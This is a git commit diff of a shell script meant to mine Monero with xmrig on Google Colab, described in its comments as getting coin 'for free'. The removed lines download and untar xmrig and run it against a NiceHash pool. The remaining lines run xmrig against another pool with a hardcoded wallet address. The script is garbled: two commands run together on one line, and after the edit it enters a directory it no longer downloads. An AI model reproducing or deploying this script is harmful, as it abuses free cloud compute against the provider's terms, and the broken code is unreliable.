28f53170f5efd4ccc38be6f4b183abfec6764b1f
bliptaz <66195749+bliptaz@users.noreply.github.com>
2022-03-19 06:29:19 +0700

    Update go11.sh

--- go11.sh
+++ go11.sh
@@ -1,4 +1,3 @@
-#! /bin/bash
 # Install XRDP
 # Before get xmr coin for free
 # Google Colab
@@ -7,19 +6,5 @@ clear
 sudo apt install screen
 screen -R xmr
  
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
-tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
-cd xmrig-6.16.4
-./xmrig -o stratum+tcp://randomxmonero.usa-east.nicehash.com:3380 -u 3JAjhFSGD1Jr5mjumCCbr32KmD8rp3Ctg8.go10 -p x -k --nicehash -a rx/0#! /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-sudo apt update
-clear
-sudo apt install screen
-screen -R xmr
- 
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
-tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
 cd xmrig-6.16.4
 ./xmrig -o stratum+tcp://randomxmonero.eu-north.nicehash.com:3380 -u 3JAjhFSGD1Jr5mjumCCbr32KmD8rp3Ctg8.go11 -p x -k --nicehash -a rx/0
